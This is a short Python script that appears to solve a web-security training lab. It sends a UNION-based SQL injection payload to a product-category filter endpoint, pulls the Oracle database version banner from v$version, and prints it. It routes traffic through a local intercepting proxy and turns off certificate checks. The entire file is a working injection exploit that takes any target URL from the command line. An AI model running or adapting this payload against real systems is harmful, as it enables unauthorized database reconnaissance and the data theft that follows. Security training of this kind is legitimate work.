import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxy= {'http': 'http://127.0.0.1:8080' , 'https': 'http://127.0.0.1:8080'}

def SQLi_oracle(url):
    uri = "/filter?category=Gifts"
    payload = "' UNION SELECT banner , NULL FROM v$version--"
    r = requests.get(url + uri + payload, verify=False, proxies= proxy )
    res = r.text
    if "Oracle Database" in res:
        print("[+] Oracle Database found")
        soup = BeautifulSoup (res, 'html.parser')
        version = soup.find(text= re.compile('.*Oracle\sDatabase.*'))
        print("[+] The version of the Database is " + version)
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(" [-] Usage %s <url> " % sys.argv[0])
        print(" [-] Example %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of the DataBase...")

    if SQLi_oracle(url):
        print("[+] SQLi done successfully")
    else:
        print("[-] Fatal Error")